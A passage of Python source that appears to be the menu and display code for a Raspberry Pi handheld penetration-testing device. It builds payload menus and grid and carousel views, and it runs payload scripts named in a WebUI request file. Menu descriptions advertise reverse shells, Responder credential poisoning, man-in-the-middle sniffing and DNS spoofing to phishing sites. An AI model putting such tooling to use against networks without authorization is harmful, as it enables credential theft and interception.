                    for p in subdir_paths
                )
                self.menu_parent[subkey] = f"ap_{cat}"
                cat_items.append([f" 📁 {subdir}", subkey])

            # Only create category menu if there are items
            if cat_items:
                key = f"ap_{cat}"
                self.menu[key] = tuple(cat_items)
                self.menu_parent[key] = "ap"
                menu_items.append([_label(cat), key])

        # Add any unexpected categories at the end
        for cat in sorted(categories.keys()):
            if cat in category_order:
                continue
            scripts = categories[cat]

            root_files = []
            subdirs = {}
            for path in scripts:
                parts = path.split('/')
                if len(parts) > 2:
                    subdir = parts[0]
                    if subdir not in subdirs:
                        subdirs[subdir] = []
                    subdirs[subdir].append(path)
                else:
                    root_files.append(path)

            cat_items = []

            # Add root files directly
            for p in root_files:
                cat_items.append([f" {os.path.splitext(os.path.basename(p))[0]}", partial(exec_payload, p)])

            # Add subdirectories as folders
            for subdir in sorted(subdirs.keys()):
                subdir_paths = subdirs[subdir]
                subkey = f"ap_{cat}_{subdir}"
                self.menu[subkey] = tuple(
                    [f" {os.path.splitext(os.path.basename(p))[0]}", partial(exec_payload, p)]
                    for p in subdir_paths
                )
                self.menu_parent[subkey] = f"ap_{cat}"
                cat_items.append([f" 📁 {subdir}", subkey])

            if cat_items:
                key = f"ap_{cat}"
                self.menu[key] = tuple(cat_items)
                self.menu_parent[key] = "ap"
                menu_items.append([_label(cat), key])

        self.menu["ap"] = tuple(menu_items) or ([" <vide>", lambda: None],)

    def __init__(self):
        # cette fois, `default` est déjà instancié → pas d'erreur
        self.menu_parent = {}
        self._build_payload_menu()
        self._inject_favorites()


### Font Awesome Icon Mapping ###
def _load_menu_icons():
    """Load menu icons from menu_icons.json. Returns flat dict."""
    icons = {}
    icon_path = os.path.join(Defaults.install_path, "menu_icons.json")
    try:
        with open(icon_path, "r") as f:
            data = json.load(f)
        for section in ("main_menu", "submenus", "categories", "payloads", "fallbacks"):
            if section in data:
                icons.update(data[section])
    except Exception:
        pass
    return icons


def _menu_icon_for_label(label: str, default_icon: str = "") -> str:
    if not label:
        return default_icon
    normalized = label.strip()
    for candidate in (label, normalized):
        icon = MENU_ICONS.get(candidate, "")
        if icon:
            return icon
    if ":" in label:
        prefix = label.split(":", 1)[0]
        for candidate in (prefix, prefix.rstrip(), prefix.strip()):
            icon = MENU_ICONS.get(candidate, "")
            if icon:
                return icon
    if normalized in SCANS:
        icon = MENU_ICONS.get("__scan__", "")
        if icon:
            return icon
    if normalized in SITES:
        icon = MENU_ICONS.get("__site__", "")
        if icon:
            return icon
    return default_icon

MENU_ICONS = _load_menu_icons()

### Menu Descriptions for Carousel View ###
MENU_DESCRIPTIONS = {
    " Scan Nmap": "Network discovery\nand port scanning\nwith Nmap",
    " Reverse Shell": "Establish reverse\nconnections for\nremote access",
    " Responder": "LLMNR, NBT-NS &\nMDNS poisoner\nfor credentials",
    " MITM & Sniff": "Man-in-the-middle\nattacks and traffic\ninterception",
    " DNS Spoofing": "Redirect DNS\nqueries to fake\nphishing sites",
    " Network info": "Display current\nnetwork interface\nand IP information",
    " WiFi Manager": "Manage wireless\nconnections and\ninterface switching",
    " Other features": "Additional tools\nand system\nconfiguration",
    " Read file": "View captured\ndata and scan\nresults",
    " Payload": "Execute custom\nPython scripts\nand tools",
    " Lock": "Set a PIN or\n6-step sequence,\nlock the device,\nand manage auto-lock",
}


def GetMenuCarousel(inlist, duplicates=False):
    """
    Display menu items in a carousel layout with huge icon in center and navigation arrows.
    - Carousel navigation: LEFT/RIGHT for main navigation
    - UP/DOWN for fine adjustment
    - Shows huge icon in center with left/right arrows
    - Returns selected item or empty string
    """
    if not inlist:
        inlist = ["Nothing here :("]

    if duplicates:
        inlist = [f"{i}#{txt}" for i, txt in enumerate(inlist)]

    total = len(inlist)
    index = m.select if m.select < total else 0

    while True:
        # Draw carousel
        try:
            draw_lock.acquire()
            _draw_toolbar()
            color.DrawMenuBackground()

            # Current item (center, large)
            current_item = inlist[index]
            txt = current_item if not duplicates else current_item.split('#', 1)[1]

            # Main item display area (center)
            main_x = _SCR_W // 2
            main_y = _SCR_H // 2

            # Draw huge icon in center
            icon = _menu_icon_for_label(txt, "\uf192")  # Default to dot-circle icon
            # Large font for the icon
            huge_icon_font = ImageFont.truetype('/usr/share/fonts/truetype/fontawesome/fa-solid-900.ttf', S(48))
            draw.text((main_x, main_y - S(12)), icon, font=huge_icon_font, fill=color.selected_text, anchor="mm")

            # Draw menu item name under the icon with custom font for carousel view
            title = txt.strip()
            # Create a bigger, bolder font specifically for carousel view
            carousel_text_font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf', S(12))
            draw.text((main_x, main_y + S(28)), title, font=carousel_text_font, fill=color.selected_text, anchor="mm")

            # Draw navigation arrows - always show if there are multiple items
            if total > 1:
                arrow_font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf', S(18))
                # Left arrow (always show for wraparound)
                draw.text((S(20), main_y), "◀", font=arrow_font, fill=color.text, anchor="mm")
                # Right arrow (always show for wraparound)
                draw.text((_SCR_W - S(20), main_y), "▶", font=arrow_font, fill=color.text, anchor="mm")
        finally:
            draw_lock.release()

        time.sleep(0.08)

        # Handle button input
        btn = getButton()
        if btn == "KEY_LEFT_PIN":
            # Wraparound navigation - go to last item if at first
            index = (index - 1) % total
        elif btn == "KEY_RIGHT_PIN":
            # Wraparound navigation - go to first item if at last
            index = (index + 1) % total
        elif btn == "KEY_UP_PIN":
            # Fine adjustment - same as left
            index = (index - 1) % total
        elif btn == "KEY_DOWN_PIN":
            # Fine adjustment - same as right
            index = (index + 1) % total
        elif btn == "KEY_PRESS_PIN":
            if index < total:
                m.select = index
                return inlist[index] if not duplicates else inlist[index].split('#', 1)[1]
        elif btn == "KEY1_PIN":
            # Toggle to next view mode
            toggle_view_mode()
            return ""
        elif btn == "KEY3_PIN":
            if m.which == "a" and _handle_main_menu_key3_double_click():
                continue
            return ""  # Go back


def GetMenuGrid(inlist, duplicates=False):
    """
    Display menu items in a grid layout (2 columns x 4 rows = 8 items visible).
    - Grid navigation: UP/DOWN/LEFT/RIGHT
    - Returns selected item or empty string
    """
    GRID_COLS = 2
    GRID_ROWS = 4
    GRID_ITEMS = GRID_COLS * GRID_ROWS

    if not inlist:
        inlist = ["Nothing here :("]

    if duplicates:
        inlist = [f"{i}#{txt}" for i, txt in enumerate(inlist)]

    total = len(inlist)
    index = m.select if m.select < total else 0

    while True:
        # Calculate grid window
        start_idx = (index // GRID_ITEMS) * GRID_ITEMS
        window = inlist[start_idx:start_idx + GRID_ITEMS]

        # Draw grid
        try:
            draw_lock.acquire()
            _draw_toolbar()
            color.DrawMenuBackground()

            for i, item in enumerate(window):
                if i >= GRID_ITEMS:
                    break

                # Calculate grid position
                row = i // GRID_COLS
                col = i % GRID_COLS

                # Grid item position
                x = default.start_text[0] + (col * S(55))
                y = default.start_text[1] + (row * S(25))

                # Check if this item is selected
                is_selected = (start_idx + i == index)

                if is_selected:
                    # Draw selection rectangle
                    draw.rectangle(
                        (x - 2, y - 2, x + S(53), y + S(23)),
                        fill=color.select
                    )
                    fill_color = color.selected_text
                else:
                    fill_color = color.text

                # Draw icon and text
                txt = item if not duplicates else item.split('#', 1)[1]
                icon = _menu_icon_for_label(txt, "")

                if icon:
                    # Draw icon
                    draw.text((x + 2, y), icon, font=icon_font, fill=fill_color)
                    # Draw short text label
                    short_text = txt.strip()[:8]  # Limit text length for grid
                    draw.text((x, y + S(13)), short_text, font=text_font, fill=fill_color)
                else:
                    # Draw text only
                    short_text = txt.strip()[:10]
                    draw.text((x, y + S(8)), short_text, font=text_font, fill=fill_color)
        finally:
            draw_lock.release()

        # Display current view mode indicator
        # draw.text((2, 2), "Grid", font=text_font, fill=color.text)

        time.sleep(0.08)

        # Handle button input
        btn = getButton()
        if btn == "KEY_UP_PIN":
            if index >= GRID_COLS:
                index -= GRID_COLS
        elif btn == "KEY_DOWN_PIN":
            if index + GRID_COLS < total:
                index += GRID_COLS
        elif btn == "KEY_LEFT_PIN":
            if index > 0 and index % GRID_COLS != 0:
                index -= 1
        elif btn == "KEY_RIGHT_PIN":
            if index < total - 1 and (index + 1) % GRID_COLS != 0:
                index += 1
        elif btn == "KEY_PRESS_PIN":
            if index < total:
                m.select = index
                return inlist[index] if not duplicates else inlist[index].split('#', 1)[1]
        elif btn == "KEY1_PIN":
            # Toggle to list view
            toggle_view_mode()
            return ""
        elif btn == "KEY3_PIN":
            if m.which == "a" and _handle_main_menu_key3_double_click():
                continue
            return ""  # Go back


def toggle_view_mode():
    """Cycle through list -> grid -> carousel -> list view modes."""
    if m.view_mode == "list":
        m.view_mode = "grid"
    elif m.view_mode == "grid":
        m.view_mode = "carousel"
    else:  # carousel
        m.view_mode = "list"
    m.select = 0  # Reset selection when switching views


def boot_health_check():
    """Quick boot-time health check (temp + routed interface/IP)."""
    try:
        routed_iface, _ = _get_routed_info()
        ip, _ = _get_interface_ipv4(routed_iface) if routed_iface else (None, None)
        msg = (
            "[HEALTH] "
            f"Temp: {temp():.0f}C | "
            f"Routed: {routed_iface or 'None'} | "
            f"IP: {ip or 'None'}"
        )
        print(msg)
    except Exception:
        pass


def _check_payload_request():
    """
    Check for a WebUI payload request file and return a payload path if present.
    """
    request_path = "/dev/shm/rj_payload_request.json"
    try:
        if not os.path.isfile(request_path):
            return None
        with open(request_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        os.remove(request_path)
        if data.get("action") == "start" and data.get("path"):
            return str(data["path"])
    except Exception:
        pass
    return None


def main():
    # Draw background once
    try:
        draw_lock.acquire()
        _draw_toolbar()
        color.DrawMenuBackground()
        color.DrawBorder()
    finally:
        draw_lock.release()

    start_background_loops()
    threading.Thread(target=boot_health_check, daemon=True).start()

    if _lock_is_enabled():
        lock_device("Startup lock")

    print("Booted in %s seconds! :)" % (time.time() - start_time))

    # Menu handling
    # Running functions from menu structure
    while True:
        requested = _check_payload_request()
        if requested:
            exec_payload(requested)
            continue
        # Use different view modes only for main menu ("a"), list view for all submenus
        if m.which == "a" and m.view_mode in ["grid", "carousel"]:
            if m.view_mode == "grid":
                selected_item = GetMenuGrid(m.GetMenuList())
            else:  # carousel
                selected_item = GetMenuCarousel(m.GetMenuList())

            if selected_item:
                # Find the index of the selected item
                menu_list = m.GetMenuList()
                x = -1
                for i, item in enumerate(menu_list):
                    if item == selected_item:
                        x = i
                        break
            else:
                x = -1
        else:
            x = m.GetMenuIndex(m.GetMenuList())

        if x >= 0:
            m.select = x
            if isinstance(m.menu[m.which][m.select][1], str):
                # Entering submenu: save position, reset to 0
                m._select_stack.append(m.select)
                m.which = m.menu[m.which][m.select][1]
                m.select = 0
            elif isinstance(m.menu[m.which][m.select][1], list):
                _saved_select = m.select
                m.select = 0
                m.menu[m.which][_saved_select][1][0](
                    m.menu[m.which][_saved_select][1][1])
                m.select = _saved_select
            else:
                _saved_select = m.select
                m.select = 0
                m.menu[m.which][_saved_select][1]()
                m.select = _saved_select
        elif len(m.which) > 1:
            # Going back: restore parent position
            if m._select_stack:
                m.select = m._select_stack.pop()
            else:
                m.select = 0
            if m.which.startswith("ap_"):
                m.which = getattr(m, "menu_parent", {}).get(m.which, "ap")
            else:
                m.which = m.which[:-1]


### Default values + LCD init ###
default = Defaults()

LCD = LCD_1in44.LCD()
Lcd_ScanDir = LCD_1in44.SCAN_DIR_DFT
LCD.LCD_Init(Lcd_ScanDir)
LCD_Config.Driver_Delay_ms(5)  # 8
#LCD.LCD_Clear()

image = Image.open(default.install_path + 'img/logo.bmp')
if image.size != (LCD.width, LCD.height):
    image = image.resize((LCD.width, LCD.height))
LCD.LCD_ShowImage(image, 0, 0)

# Create draw objects BEFORE main() so color functions can use them
image = Image.new("RGB", (LCD.width, LCD.height), "WHITE")
draw = ImageDraw.Draw(image)
text_font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf', S(10))
icon_font = ImageFont.truetype('/usr/share/fonts/truetype/fontawesome/fa-solid-900.ttf', S(13))
font = text_font  # Keep backward compatibility

### Defining PINS, threads, loading JSON ###
PINS = {
    "KEY_UP_PIN": 6,
    "KEY_DOWN_PIN": 19,
    "KEY_LEFT_PIN": 5,
    "KEY_RIGHT_PIN": 26,
    "KEY_PRESS_PIN": 13,
    "KEY1_PIN": 21,
    "KEY2_PIN": 20,
    "KEY3_PIN": 16
}
LoadConfig()
m = DisposableMenu()

### Info ###
print("I'm running on " + str(temp()).split('.')[0] + " °C.")
print(time.strftime("%H:%M:%S"))

# Delay for logo
time.sleep(2)




if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        Leave()
